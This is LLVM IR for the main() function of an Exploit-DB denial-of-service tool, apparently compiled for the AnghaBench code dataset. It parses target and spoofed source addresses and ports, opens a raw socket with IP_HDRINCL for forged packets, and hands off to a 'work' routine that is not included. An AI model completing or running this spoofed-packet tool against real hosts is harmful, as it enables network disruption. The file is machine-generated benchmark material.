; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_24696.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_24696.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@TRUE = common dso_local global i32 0, align 4
@usage = common dso_local global i8* null, align 8
@INADDR_NONE = common dso_local global i32 0, align 4
@da = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [31 x i8] c"dest ip address is NOT valid!\0A\00", align 1
@dip = common dso_local global i8* null, align 8
@dp = common dso_local global i32 0, align 4
@dport = common dso_local global i32* null, align 8
@sa = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [33 x i8] c"source ip address is NOT valid!\0A\00", align 1
@sip = common dso_local global i8* null, align 8
@sp = common dso_local global i32 0, align 4
@sport = common dso_local global i32* null, align 8
@.str.2 = private unnamed_addr constant [21 x i8] c"WSAStartup() failed\0A\00", align 1
@INVALID_SOCKET = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@SOCKET_ERROR = common dso_local global i64 0, align 8
@IPPROTO_IP = common dso_local global i32 0, align 4
@IP_HDRINCL = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = call i32 @MAKEWORD(i32 2, i32 2)
  store i32 %12, i32* %6, align 4
  store i32 1, i32* %10, align 4
  %13 = load i32, i32* @TRUE, align 4
  store i32 %13, i32* %11, align 4
  %14 = load i32, i32* %4, align 4
  %15 = icmp ne i32 5, %14
  br i1 %15, label %16, label %22

16:                                               ; preds = %2
  %17 = load i8*, i8** @usage, align 8
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i8*, ...) @printf(i8* %17, i8* %20)
  br label %152

22:                                               ; preds = %2
  %23 = load i32, i32* @INADDR_NONE, align 4
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 1
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @inet_addr(i8* %26)
  store i32 %27, i32* @da, align 4
  %28 = icmp eq i32 %23, %27
  br i1 %28, label %29, label %36

29:                                               ; preds = %22
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str, i64 0, i64 0))
  %31 = load i8*, i8** @usage, align 8
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 (i8*, ...) @printf(i8* %31, i8* %34)
  br label %152

36:                                               ; preds = %22
  store i8* bitcast (i32* @da to i8*), i8** %8, align 8
  %37 = load i8*, i8** %8, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 0
  %39 = load i8, i8* %38, align 1
  %40 = load i8*, i8** @dip, align 8
  %41 = getelementptr inbounds i8, i8* %40, i64 0
  store i8 %39, i8* %41, align 1
  %42 = load i8*, i8** %8, align 8
  %43 = getelementptr inbounds i8, i8* %42, i64 1
  %44 = load i8, i8* %43, align 1
  %45 = load i8*, i8** @dip, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  store i8 %44, i8* %46, align 1
  %47 = load i8*, i8** %8, align 8
  %48 = getelementptr inbounds i8, i8* %47, i64 2
  %49 = load i8, i8* %48, align 1
  %50 = load i8*, i8** @dip, align 8
  %51 = getelementptr inbounds i8, i8* %50, i64 2
  store i8 %49, i8* %51, align 1
  %52 = load i8*, i8** %8, align 8
  %53 = getelementptr inbounds i8, i8* %52, i64 3
  %54 = load i8, i8* %53, align 1
  %55 = load i8*, i8** @dip, align 8
  %56 = getelementptr inbounds i8, i8* %55, i64 3
  store i8 %54, i8* %56, align 1
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 2
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @atoi(i8* %59)
  store i32 %60, i32* @dp, align 4
  %61 = load i32, i32* @dp, align 4
  %62 = shl i32 %61, 16
  %63 = ashr i32 %62, 24
  %64 = load i32*, i32** @dport, align 8
  %65 = getelementptr inbounds i32, i32* %64, i64 0
  store i32 %63, i32* %65, align 4
  %66 = load i32, i32* @dp, align 4
  %67 = shl i32 %66, 24
  %68 = ashr i32 %67, 24
  %69 = load i32*, i32** @dport, align 8
  %70 = getelementptr inbounds i32, i32* %69, i64 1
  store i32 %68, i32* %70, align 4
  %71 = load i32, i32* @INADDR_NONE, align 4
  %72 = load i8**, i8*** %5, align 8
  %73 = getelementptr inbounds i8*, i8** %72, i64 3
  %74 = load i8*, i8** %73, align 8
  %75 = call i32 @inet_addr(i8* %74)
  store i32 %75, i32* @sa, align 4
  %76 = icmp eq i32 %71, %75
  br i1 %76, label %77, label %84

77:                                               ; preds = %36
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.1, i64 0, i64 0))
  %79 = load i8*, i8** @usage, align 8
  %80 = load i8**, i8*** %5, align 8
  %81 = getelementptr inbounds i8*, i8** %80, i64 3
  %82 = load i8*, i8** %81, align 8
  %83 = call i32 (i8*, ...) @printf(i8* %79, i8* %82)
  br label %152

84:                                               ; preds = %36
  store i8* bitcast (i32* @sa to i8*), i8** %8, align 8
  %85 = load i8*, i8** %8, align 8
  %86 = getelementptr inbounds i8, i8* %85, i64 0
  %87 = load i8, i8* %86, align 1
  %88 = load i8*, i8** @sip, align 8
  %89 = getelementptr inbounds i8, i8* %88, i64 0
  store i8 %87, i8* %89, align 1
  %90 = load i8*, i8** %8, align 8
  %91 = getelementptr inbounds i8, i8* %90, i64 1
  %92 = load i8, i8* %91, align 1
  %93 = load i8*, i8** @sip, align 8
  %94 = getelementptr inbounds i8, i8* %93, i64 1
  store i8 %92, i8* %94, align 1
  %95 = load i8*, i8** %8, align 8
  %96 = getelementptr inbounds i8, i8* %95, i64 2
  %97 = load i8, i8* %96, align 1
  %98 = load i8*, i8** @sip, align 8
  %99 = getelementptr inbounds i8, i8* %98, i64 2
  store i8 %97, i8* %99, align 1
  %100 = load i8*, i8** %8, align 8
  %101 = getelementptr inbounds i8, i8* %100, i64 3
  %102 = load i8, i8* %101, align 1
  %103 = load i8*, i8** @sip, align 8
  %104 = getelementptr inbounds i8, i8* %103, i64 3
  store i8 %102, i8* %104, align 1
  %105 = load i8**, i8*** %5, align 8
  %106 = getelementptr inbounds i8*, i8** %105, i64 4
  %107 = load i8*, i8** %106, align 8
  %108 = call i32 @atoi(i8* %107)
  store i32 %108, i32* @sp, align 4
  %109 = load i32, i32* @sp, align 4
  %110 = shl i32 %109, 16
  %111 = ashr i32 %110, 24
  %112 = load i32*, i32** @sport, align 8
  %113 = getelementptr inbounds i32, i32* %112, i64 0
  store i32 %111, i32* %113, align 4
  %114 = load i32, i32* @sp, align 4
  %115 = shl i32 %114, 24
  %116 = ashr i32 %115, 24
  %117 = load i32*, i32** @sport, align 8
  %118 = getelementptr inbounds i32, i32* %117, i64 1
  store i32 %116, i32* %118, align 4
  %119 = call i64 @time(i32 0)
  %120 = trunc i64 %119 to i32
  %121 = call i32 @srand(i32 %120)
  %122 = load i32, i32* %6, align 4
  %123 = call i64 @WSAStartup(i32 %122, i32* %7)
  %124 = icmp ne i64 %123, 0
  br i1 %124, label %125, label %127

125:                                              ; preds = %84
  %126 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0))
  br label %152

127:                                              ; preds = %84
  %128 = load i32, i32* @INVALID_SOCKET, align 4
  %129 = load i32, i32* @AF_INET, align 4
  %130 = load i32, i32* @SOCK_RAW, align 4
  %131 = load i32, i32* @IPPROTO_RAW, align 4
  %132 = call i32 @WSASocket(i32 %129, i32 %130, i32 %131, i32 0, i32 0, i32 0)
  store i32 %132, i32* %9, align 4
  %133 = icmp eq i32 %128, %132
  br i1 %133, label %134, label %135

134:                                              ; preds = %127
  br label %150

135:                                              ; preds = %127
  %136 = load i64, i64* @SOCKET_ERROR, align 8
  %137 = load i32, i32* %9, align 4
  %138 = load i32, i32* @IPPROTO_IP, align 4
  %139 = load i32, i32* @IP_HDRINCL, align 4
  %140 = bitcast i32* %11 to i8*
  %141 = call i64 @setsockopt(i32 %137, i32 %138, i32 %139, i8* %140, i32 4)
  %142 = icmp eq i64 %136, %141
  br i1 %142, label %143, label %144

143:                                              ; preds = %135
  br label %147

144:                                              ; preds = %135
  %145 = load i32, i32* %9, align 4
  %146 = call i32 @work(i32 %145)
  br label %147

147:                                              ; preds = %144, %143
  %148 = load i32, i32* %9, align 4
  %149 = call i32 @closesocket(i32 %148)
  br label %150

150:                                              ; preds = %147, %134
  %151 = call i32 (...) @WSACleanup()
  br label %152

152:                                              ; preds = %150, %125, %77, %29, %16
  %153 = load i32, i32* %10, align 4
  ret i32 %153
}

declare dso_local i32 @MAKEWORD(i32, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @srand(i32) #1

declare dso_local i64 @time(i32) #1

declare dso_local i64 @WSAStartup(i32, i32*) #1

declare dso_local i32 @WSASocket(i32, i32, i32, i32, i32, i32) #1

declare dso_local i64 @setsockopt(i32, i32, i32, i8*, i32) #1

declare dso_local i32 @work(i32) #1

declare dso_local i32 @closesocket(i32) #1

declare dso_local i32 @WSACleanup(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
